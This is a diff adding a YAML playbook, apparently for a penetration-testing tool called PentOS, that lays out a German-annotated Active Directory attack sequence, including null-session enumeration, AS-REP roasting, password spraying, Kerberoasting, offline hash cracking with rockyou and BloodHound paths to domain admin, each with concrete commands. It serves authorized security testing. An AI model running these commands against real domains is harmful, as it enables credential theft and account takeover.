@@ -1,0 +1,55 @@
+name: ad
+title: Active Directory
+description: Methodik für AD-Enumeration und -Angriffe (autorisiert).
+steps:
+  - id: ports
+    title: Hosts & AD-Dienste scannen
+    kind: pentos
+    command: pentos run nmap {target} --profile full
+    why: DC erkennen (88 Kerberos, 389/636 LDAP, 445 SMB, 3268 GC).
+  - id: smb-enum
+    title: SMB/AD ohne Auth enumerieren
+    kind: pentos
+    command: pentos run enum4linux-ng {target}
+    why: Null-Session, Shares, ggf. User/Domain-Infos.
+  - id: nxc-null
+    title: NetExec – Null/Guest und Host-Infos
+    kind: pentos
+    command: pentos run nxc-smb {target} --args "-u '' -p ''"
+    why: Domain, Signing, OS; Basis für weiteres Spraying.
+  - id: users
+    title: Benutzerliste aufbauen
+    kind: manual
+    why: Aus enum4linux/RID-Cycling/OSINT eine users.txt zusammenstellen.
+  - id: asrep
+    title: AS-REP Roasting (Accounts ohne Preauth)
+    kind: external
+    tool: impacket-GetNPUsers
+    command: impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip {target} -no-pass
+    why: Hashes ohne gültige Creds abgreifen, offline cracken.
+  - id: spray
+    title: Password-Spraying (vorsichtig, Lockout beachten)
+    kind: pentos
+    command: pentos run nxc-smb {target} --args "-u users.txt -p '<Passwort>' --continue-on-success"
+    why: Ein Passwort gegen viele User – Lockout-Policy aus enum4linux beachten.
+  - id: kerberoast
+    title: Kerberoasting (SPN-Accounts) nach gültigen Creds
+    kind: external
+    tool: impacket-GetUserSPNs
+    command: impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip {target} -request
+    why: Service-Account-Hashes abgreifen und offline cracken.
+  - id: crack
+    title: Erbeutete Hashes offline cracken
+    kind: pentos
+    command: pentos run john --args "hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt"
+    why: AS-REP/Kerberoast-Hashes zu Klartext-Passwörtern.
+  - id: bloodhound
+    title: Angriffspfade mit BloodHound auswerten
+    kind: external
+    tool: BloodHound
+    why: Nach gültigen Creds Daten sammeln (z.B. bloodhound-python) und Pfade zu DA finden.
+  - id: pwn
+    title: Zugriff bestätigen (Pwn3d) & dokumentieren
+    kind: pentos
+    command: pentos run nxc-smb {target} --args "-u <user> -p <pass>"
+    why: Admin-Zugriff verifizieren; PentOS legt (Pwn3d!) automatisch als Finding/Loot ab.
